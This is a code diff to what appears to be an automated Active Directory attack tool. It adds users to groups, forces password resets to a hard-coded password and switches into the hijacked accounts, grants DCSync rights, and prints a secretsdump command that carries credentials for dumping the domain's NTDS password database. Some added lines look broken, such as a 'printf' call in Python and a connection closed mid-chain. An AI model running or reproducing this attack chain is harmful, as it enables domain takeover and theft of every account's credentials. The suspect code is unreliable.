@@ -39,6 +39,7 @@ class Automation:
     def _washer(self):
         for laundry in self.dirty_laundry:
             laundry['f'](self.conn, *laundry['args'])
+        self.dirty_laundry = []
 
     def _switchUser(self, user, pwd):
         self._washer()
@@ -48,6 +49,7 @@ class Automation:
         return
     
     def _dcSync(self, rel):
+        printf(f"[+] You can now dump the NTDS using: secretsdump.py '{self.conn.conf.domain}/{self.conn.conf.username}:{self.conn.conf.password}@{self.conn.conf.host}'")
         return
     
     def _setDCSync(self, rel):
@@ -64,6 +66,7 @@ class Automation:
         group = rel['end_node']['distinguishedname']
         modules.addForeignObjectToGroup(self.conn, member, group)
         self.dirty_laundry.append({'f':modules.delObjectFromGroup, 'args':[member,group]})
+        self.conn.close()
     
     def _aclGroup(self, rel):
         self._genericAll(rel)
@@ -89,10 +92,11 @@ class Automation:
     # TODO: don't perform change password if it's explicitly refused by user
     def _forceChangePassword(self, rel):
         user = rel['end_node']['distinguishedname']
-        pwd = 'Password512!'
+        pwd = 'Password123!'
         LOG.debug(f'[+] changing {user} password')
         modules.changePassword(self.conn, user, pwd)
         LOG.info(f'[+] password changed to {pwd} for {user}')
+        user = utils.getObjAttr(self.conn, user, 'sAMAccountName')['attributes']['sAMAccountName']
         self._switchUser(user, pwd)
         LOG.debug(f'[+] switching to LDAP/SAMR connection for user {user}')
 
